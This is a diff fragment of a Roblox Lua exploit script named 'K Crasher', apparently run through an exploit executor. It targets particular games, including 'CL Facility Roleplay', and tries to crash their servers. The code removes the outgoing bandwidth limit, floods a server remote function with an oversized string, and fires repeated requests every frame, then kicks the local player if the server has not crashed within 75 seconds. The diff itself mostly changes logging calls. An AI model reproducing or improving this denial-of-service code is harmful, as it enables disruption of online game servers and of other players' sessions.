@@ -84,7 +84,7 @@ for i,v in pairs(_G.CrashSettings.Games) do -- Check if the game is valid and is
 		if _G.CrashSettings.DisableViaPos[1] ~= nil then
 			for _,d in pairs(_G.CrashSettings.DisableViaPos) do
 				if i == d then
-					return warn('K Crasher asked to be disabled in this part')
+					return printconsole('K Crasher asked to be disabled in this part')
 				end
 			end
 		end;
@@ -275,7 +275,6 @@ coroutine.wrap(function()
 	local Players = game:GetService('Players')
 	local Dir = game:GetService('CoreGui'):WaitForChild("RobloxPromptGui",math.huge):WaitForChild("promptOverlay",math.huge)
 	local a = false
-	warn('Found DIRECTORY K~ Crahser');
 	Dir.DescendantAdded:Connect(function(Err)
 		if Err.Name == 'ErrorMessage' then
 			_G.ErrMessage = if Dir:FindFirstChild('ErrorMessage', true) then Dir:FindFirstChild('ErrorMessage', true).Text else '?'
@@ -819,18 +818,19 @@ function C.K_6416498845() -- CL Facility Roleplay
 	}
 }
 ]]
+	spawn(function() 	local j = SettingsService.RF.Get:InvokeServer(); print(j[1]:len(), 'also1') end)
 	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
 	for i = 1, 2 do game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge); SettingsService.RF.Set:InvokeServer({LongString}); end
 	spawn(function()
 	print('test mode!')
 	local j = SettingsService.RF.Get:InvokeServer()
-	print(j[1], j[1]:len())
+	print(j[1]:len(),'also2')
 			end)
 
 	task.wait(3)	
 	--end
-	warn('Game server completed sending request!')
-	warn('Attempting to crash')
+	printconsole('Game server completed sending request!')
+	printconsole('Attempting to crash')
 
 	game:GetService('RunService').RenderStepped:Connect(function()
 		for i = 1, 6500 do
@@ -844,7 +844,7 @@ function C.K_6416498845() -- CL Facility Roleplay
 	end)
 
 	wait(75)
-	warn('Client did not crash server within 75 seconds of Get Request.')
+	printconsole('Client did not crash server within 75 seconds of Get Request.')
 	game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 75 seconds of last Get Request')
 end
 function C.K_3226555017()
